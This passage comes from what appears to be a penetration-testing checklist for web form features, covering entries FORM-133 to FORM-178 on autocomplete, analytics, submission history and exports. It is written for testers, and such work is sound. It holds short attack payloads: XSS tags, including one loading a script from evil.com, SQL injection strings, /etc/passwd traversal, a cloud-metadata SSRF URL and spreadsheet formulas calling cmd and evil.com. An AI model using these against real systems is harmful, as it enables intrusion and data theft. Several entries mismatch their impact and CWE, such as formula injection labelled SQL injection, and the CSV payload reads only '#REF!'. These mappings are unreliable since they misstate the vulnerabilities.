Address: <script>alert(1)</script> Street
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-134 — Address Autocomplete SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Autocomplete calls external API 2. Manipulate request 3. SSRF via autocomplete 4. Internal access

**Expected Result:** Autocomplete requests should be restricted

**Payload Example:**

```
Proxy autocomplete to internal URLs
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FORM-135 — API Key Exposure in Autocomplete
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Analyze autocomplete requests 2. Find API key in request 3. Extract key 4. Abuse key

**Expected Result:** API keys should be server-side or restricted

**Payload Example:**

```
Google Maps API key exposed in requests
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-136 — Address Data Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Select autocomplete address 2. Modify selected data 3. Inject malicious address 4. Bypass validation

**Expected Result:** Selected data should be re-validated

**Payload Example:**

```
Modify autocomplete response to inject payload
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-137 — Autocomplete Rate Abuse
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Rapidly trigger autocomplete 2. Flood API with requests 3. Exhaust API quota 4. Service disruption

**Expected Result:** Autocomplete should be rate-limited

**Payload Example:**

```
1000 autocomplete requests per minute
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FORM-138 — Autocomplete Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Autocomplete results cached 2. Inject malicious result 3. Cache poisoned 4. Serve malicious to others

**Expected Result:** Cache should not include user input

**Payload Example:**

```
Poison cached autocomplete results
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## FORM-139 — Location Privacy Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Autocomplete tracks input 2. Analyze sent data 3. IP and location exposed 4. Privacy violation

**Expected Result:** Only necessary data should be sent

**Payload Example:**

```
Full address history sent to third party
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## FORM-140 — Autocomplete SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Autocomplete queries database 2. Inject SQL in query 3. Extract data 4. Database compromise

**Expected Result:** Autocomplete queries should be parameterized

**Payload Example:**

```
query='; SELECT * FROM addresses--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-141 — Address Validation Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Invalid address entered 2. Bypass validation via autocomplete 3. Submit invalid address 4. Order to non-existent location

**Expected Result:** Final address should be validated

**Payload Example:**

```
Modify validated address before submit
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-142 — Third-Party Service Hijacking
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Autocomplete uses third-party 2. Manipulate third-party response 3. Inject false addresses 4. Mislead users

**Expected Result:** Third-party responses should be validated

**Payload Example:**

```
MITM on autocomplete service
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / mitmproxy

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-143 — Analytics Data IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. View own form analytics 2. Modify form_id 3. View another's analytics 4. Competitive intelligence

**Expected Result:** Analytics should verify ownership

**Payload Example:**

```
GET /api/forms/victim_form/analytics
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-144 — Analytics XSS via Form Data
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. Submit form with XSS 2. Analytics displays submission 3. XSS executes in admin panel 4. Admin compromise

**Expected Result:** Analytics should sanitize displayed data

**Payload Example:**

```
<script>stealAdminSession()</script> in form field
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-145 — Analytics SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. Analytics query with parameters 2. Inject SQL in date/filter 3. Extract all analytics 4. Data breach

**Expected Result:** Analytics queries should be parameterized

**Payload Example:**

```
date_from=2024-01-01'; SELECT * FROM analytics--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-146 — Analytics Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. Export own analytics 2. Modify scope 3. Export all users' data 4. Mass data breach

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/analytics/export?scope=all
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-147 — Analytics Tracking Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. Find analytics tracking code 2. Inject malicious tracking 3. Track users maliciously 4. Privacy violation

**Expected Result:** Tracking code should be controlled

**Payload Example:**

```
Inject <script src="evil.com/track.js">
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-148 — User Behavior Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. Analytics tracks behavior 2. Access behavior data 3. View user interactions 4. Privacy violation

**Expected Result:** Behavior tracking should be anonymized

**Payload Example:**

```
Access detailed user session recordings
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-149 — Analytics API Rate Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. Analytics API rate-limited 2. Bypass limit 3. Scrape all analytics 4. Data exfiltration

**Expected Result:** Rate limits should be robust

**Payload Example:**

```
IP rotation to bypass analytics limits
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-840; PortSwigger Business logic

---

## FORM-150 — Real-Time Analytics WebSocket
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. Connect to analytics WebSocket 2. Receive real-time data 3. Access others' live data 4. Live monitoring

**Expected Result:** WebSocket should verify permissions

**Payload Example:**

```
WS connection without proper auth
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / WS King

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-151 — Analytics Funnel Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. View conversion funnel 2. Modify funnel data 3. Inflate/deflate metrics 4. False reporting

**Expected Result:** Analytics should be tamper-proof

**Payload Example:**

```
Modify funnel stage counts
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-152 — PII in Analytics
**Test Category:** Privacy Violation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Analytics

**Test Steps:** 1. Analytics collects PII 2. PII stored without consent 3. Compliance violation 4. Legal risk

**Expected Result:** PII should be anonymized or consented

**Payload Example:**

```
Names/emails in analytics data
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Manual Review

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## FORM-153 — Submission History IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. View own submissions 2. Modify user_id 3. View others' submissions 4. Privacy violation

**Expected Result:** History should be user-specific

**Payload Example:**

```
GET /api/users/victim_id/submissions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-154 — Submission Detail IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. View own submission detail 2. Modify submission_id 3. View others' details 4. Data exposure

**Expected Result:** Details should verify ownership

**Payload Example:**

```
GET /api/submissions/victim_submission_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-155 — Submission Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. Delete own submission 2. Modify submission_id 3. Delete others' submissions 4. Data destruction

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/submissions/victim_submission_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-156 — Submission Modification IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. Edit own submission 2. Modify submission_id 3. Edit others' submissions 4. Data tampering

**Expected Result:** Edit should verify ownership

**Payload Example:**

```
PUT /api/submissions/victim_submission_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-157 — Stored XSS in Submission
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. Submit form with XSS 2. View submission history 3. XSS executes 4. Session theft

**Expected Result:** Historical data should be sanitized

**Payload Example:**

```
<script>alert(document.cookie)</script> in field
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-158 — Submission Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. Iterate submission IDs 2. Find valid submissions 3. Map submission patterns 4. Intelligence gathering

**Expected Result:** IDs should be unpredictable

**Payload Example:**

```
/submissions/1 through /submissions/10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## FORM-159 — SQL Injection in History Search
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. Search submissions 2. Inject SQL payload 3. Extract all data 4. Data breach

**Expected Result:** Search should be parameterized

**Payload Example:**

```
search='; SELECT * FROM submissions--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-160 — History Pagination Exploit
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. Paginate through history 2. Modify pagination params 3. Access beyond allowed 4. View unauthorized data

**Expected Result:** Pagination should respect permissions

**Payload Example:**

```
?limit=999999&offset=0
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-161 — Submission Attachment Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. Download own attachment 2. Modify attachment path 3. Access others' files 4. Data breach

**Expected Result:** Attachments should verify ownership

**Payload Example:**

```
Download attachment from other submission
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-162 — History Timestamp Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. View submissions by time 2. Modify timestamp filter 3. Access restricted timeframe 4. View archived data

**Expected Result:** Time filters should be validated

**Payload Example:**

```
Access data outside allowed date range
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-163 — Submission Status Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. Submission has status 2. Modify status field 3. Change processing status 4. Bypass workflow

**Expected Result:** Status changes should be authorized

**Payload Example:**

```
Change status from pending to approved
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-164 — Cross-Form Submission Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Submission History

**Test Steps:** 1. Access form A submissions 2. Modify form_id 3. Access form B submissions 4. Cross-form data

**Expected Result:** Form scope should be enforced

**Payload Example:**

```
Access other forms' submissions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-165 — Export IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Export own responses 2. Modify form_id 3. Export others' responses 4. Data exfiltration

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/forms/victim_form/export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-166 — CSV Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Submit form with formula 2. Export to CSV 3. Open in Excel 4. Formula executes

**Expected Result:** CSV should escape formula characters

**Payload Example:**

```
#REF!
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Excel

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-167 — Excel Formula Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Submit form with Excel formula 2. Export to XLSX 3. Open in Excel 4. Code execution

**Expected Result:** Excel export should sanitize formulas

**Payload Example:**

```
=EXEC("cmd") or =INDIRECT("http://evil.com")
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Excel

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-168 — Export Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Request export 2. Modify filename parameter 3. Traverse path 4. Access system files

**Expected Result:** Export paths should be validated

**Payload Example:**

```
filename=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FORM-169 — Export SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Export with date filter 2. Inject SQL in filter 3. Extract entire database 4. Data breach

**Expected Result:** Export queries should be parameterized

**Payload Example:**

```
date_from='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-170 — Export DoS via Large Dataset
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Request export of all data 2. Server generates huge file 3. Memory exhaustion 4. DoS

**Expected Result:** Export should have pagination limits

**Payload Example:**

```
Export request with no limits
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FORM-171 — Export XXE via XLSX
**Test Category:** XML External Entity · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. XLSX is XML-based 2. Manipulate generated XLSX 3. XXE in XML 4. File disclosure

**Expected Result:** XLSX generation should be secure

**Payload Example:**

```
XXE in Excel XML content
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## FORM-172 — Export Token Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Export generates download token 2. Analyze token 3. Generate token for others' data 4. Download unauthorized

**Expected Result:** Tokens should be unpredictable and scoped

**Payload Example:**

```
Forge export_token for victim's data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-173 — Export SSRF via Webhook
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Export to webhook URL 2. Provide internal URL 3. SSRF via export 4. Internal access

**Expected Result:** Webhook URLs should be validated

**Payload Example:**

```
webhook=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FORM-174 — Sensitive Data in Export
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Export includes hidden fields 2. Hidden fields contain sensitive data 3. PII exposed 4. Privacy violation

**Expected Result:** Hidden fields should not export

**Payload Example:**

```
Exported file containing password hashes
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Manual Review

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-175 — Export Format Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Modify export format 2. Request unsupported format 3. Error disclosure 4. System information

**Expected Result:** Formats should be whitelisted

**Payload Example:**

```
format=../../../etc/passwd or format=php
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-176 — Concurrent Export Abuse
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Request many exports simultaneously 2. Exhaust server resources 3. DoS 4. Service disruption

**Expected Result:** Export should be queued and limited

**Payload Example:**

```
100 concurrent export requests
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FORM-177 — Export Cache Poisoning
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Responses (CSV/Excel)

**Test Steps:** 1. Export cached 2. Poison cache 3. Serve wrong user's data 4. Data leak

**Expected Result:** Exports should not be cached or be user-specific

**Payload Example:**

```
Cache poisoning on export endpoint
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## FORM-178 — Template IDOR Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Templates

